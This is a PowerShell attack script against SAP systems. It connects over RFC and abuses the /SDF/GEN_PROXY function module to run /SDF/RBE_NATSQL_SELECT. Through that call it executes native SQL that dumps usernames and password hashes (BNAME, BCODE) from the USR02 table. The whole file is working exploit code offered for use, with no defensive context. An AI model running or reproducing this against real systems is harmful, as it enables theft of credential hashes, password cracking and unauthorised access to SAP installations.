  <#
    .Synopsis
      Calls RBE_NATSQL_SELECT Local FM via GEN_PROXY Remote FM of an SAP system.
    .Description
      Calls the function module RBE_NATSQL_SELECT to read the USR02 table.
    .Author
      @_Sn0rkY
   
    All credits to Joris Van De Vis for the tricks
  #>

  #-Function Load-NCo: Loads NCo libraries
     Function Load-NCo {

      $ScriptDir = $PsScriptRoot
      
      $Size = [System.IntPtr]::Size
        If ($Size -eq 4) {
        $Path = $ScriptDir + "\..\..\NCo_x86\"
      }
      ElseIf ($Size -eq 8) {
        $Path = $ScriptDir + "\..\..\NCo_x86_64\"
      }

      [Reflection.Assembly]::LoadFile($Path + "sapnco.dll") > $Null
      [Reflection.Assembly]::LoadFile($Path + "sapnco_utils.dll") > $Null

    }

   #-Function Get-Destination: Target and credential
    Function Get-Destination {

    # Set Parameters
    Param(
    [parameter(Mandatory = $true)]
    [alias("t")]
    [string]$target,

    [parameter(Mandatory = $true)]
    [alias("s")]
    [string]$sysnr,	
	
    [parameter(Mandatory = $true)]
    [alias("c")]
    [string]$client,
  
    [parameter(Mandatory = $true)]
    [alias("u")]
    [string]$username,
    
    [parameter(Mandatory = $true)]
    [string]$password = $( Read-Host -asSecureString "Input password" )
    )
    
    #-Connection parameters-------------------------------------------
        $cfgParams = New-Object SAP.Middleware.Connector.RfcConfigParameters
        $cfgParams.Add("NAME", "TEST")
        $cfgParams.Add("ASHOST", $target)
        $cfgParams.Add("SYSNR", $sysnr)
        $cfgParams.Add("CLIENT", $client)
        $cfgParams.Add("USER", $username)
        $cfgParams.Add("PASSWD", $password)

      Return [SAP.Middleware.Connector.RfcDestinationManager]::GetDestination($cfgParams)
     
     }        


  #-Function Get-GenProxy: 
    Function Get-GenProxy () {
      Load-NCo
      $destination = Get-Destination

      #-Metadata--------------------------------------------------------
      [SAP.Middleware.Connector.IRfcFunction]$rfcFunction =
        $destination.Repository.CreateFunction("/SDF/GEN_PROXY")

      #-Sets import parameter
       [SAP.Middleware.Connector.IRfcTable]$Input = 
        $rfcFunction.GetTable("INPUT")
        $Input.Append()
        $Input.SetValue("FB_NAME", "/SDF/RBE_NATSQL_SELECT")

      #-Here GetValue instead GetTable
       [SAP.Middleware.Connector.IRfcTable]$Params = $Input.GetValue("PARAMETERS")
        $Params.Append()
        $Params.SetValue("PARAM", "MAX_ROWS")
        $Params.SetValue("VALUE", "999")
        $Params.Append()
        $Params.SetValue("PARAM", "SQL_TEXT")
        $Params.SetValue("VALUE", "SELECT BNAME, BCODE FROM USR02")


      #-Calls function module
        $rfcFunction.Invoke($destination)

      #-Shows export parameters
      #TODO: parsing the results
        Write-Host "`r`n==== RESULTS ===`r`n"
        Write-Host $rfcFunction.GetValue("RESULT")     
    }

#-Main

Get-GenProxy

#-End
